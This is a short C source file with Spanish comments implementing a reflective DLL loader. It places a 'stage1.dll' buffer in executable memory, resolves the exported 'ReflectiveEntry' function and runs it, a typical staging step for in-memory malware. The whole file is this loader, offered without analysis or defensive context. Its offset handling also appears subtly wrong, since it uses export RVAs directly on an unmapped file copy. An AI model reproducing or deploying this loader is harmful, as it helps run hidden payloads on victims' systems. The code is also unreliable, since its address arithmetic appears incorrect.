//  Cargar una DLL reflejada desde memoria y ejecutar ReflectiveEntry()
// ==============================================

#include <windows.h>
#include <stdio.h>
#include <string.h>

// Prototipo exportado desde stage1.dll
typedef void (*ReflectiveEntryFunc)(void);

int load_reflective_stage1(unsigned char* dll_buf, size_t dll_size) {
    // alloc memoria RWX para contener la DLL completa en memoria
    LPVOID dll_mem = VirtualAlloc(NULL, dll_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!dll_mem) return 0;

    // cp al binario completo (buffer .dat) en memoria
    memcpy(dll_mem, dll_buf, dll_size);

    // headers PE para acceder al Export Table
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_mem;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll_mem + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD rva_export = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva_export) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)dll_mem + rva_export);
    DWORD* funcs = (DWORD*)((BYTE*)dll_mem + exp->AddressOfFunctions);
    DWORD* names = (DWORD*)((BYTE*)dll_mem + exp->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)dll_mem + exp->AddressOfNameOrdinals);

    //  ReflectiveEntry y resolver su offset
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* fname = (char*)((BYTE*)dll_mem + names[i]);
        if (strcmp(fname, "ReflectiveEntry") == 0) {
            DWORD offset = funcs[ordinals[i]];
            ReflectiveEntryFunc fn = (ReflectiveEntryFunc)((BYTE*)dll_mem + offset);
            fn(); // Ejecuta stage1.dll 
            return 1;
        }
    }
    return 0;
}

